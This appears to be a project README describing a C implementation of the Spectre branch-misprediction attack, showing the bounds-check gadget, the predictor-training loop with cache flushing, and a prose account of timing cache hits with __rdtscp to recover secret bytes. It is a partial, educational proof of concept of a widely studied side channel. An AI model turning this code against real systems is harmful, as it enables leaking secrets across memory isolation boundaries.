# Spectre Attack
Implementation of the [spectre attack](https://en.wikipedia.org/wiki/Spectre_(security_vulnerability)) using C

# Solution
The solution uses conditional branch misprediction to read secret information stored in the program’s address space.

Attack function:
```c
void f(size_t i) {
    uint8_t someValue = 0;
    if (i < indexArraySize) {
        someValue &= attackArray[indexArray[i] * CACHE_LINE];
    }
}
```

The process of attacks:
1. First we teach the branch predictor with a valid index (it does not go beyond the boundaries of the indexArray array)
2. Then we try to get data from `needAddress` (after clearing the cache)
```c
int x = 0;
size_t validIndex = try % indexArraySize;
for (volatile int j = 0; j < NUMBER_ATTACKS; j++) {
  makeDelay();

  x += j;
  x = x * x;
  x <<= 2;

  size_t index = ((j % ATTACKS_INTERVAL) - 1) & ~0xFFFF;
  index = validIndex ^ ((index | (index >> 16)) & (needAddress ^ validIndex));

  _mm_clflush(&indexArraySize);
  f(index);
}
```

After the attacks, we start searching in the cache for the element we need. Using the `__rdtscp` function, we count the time. If the time is less than `CACHE_HIT`, we count the hit of the symbol in the cache.
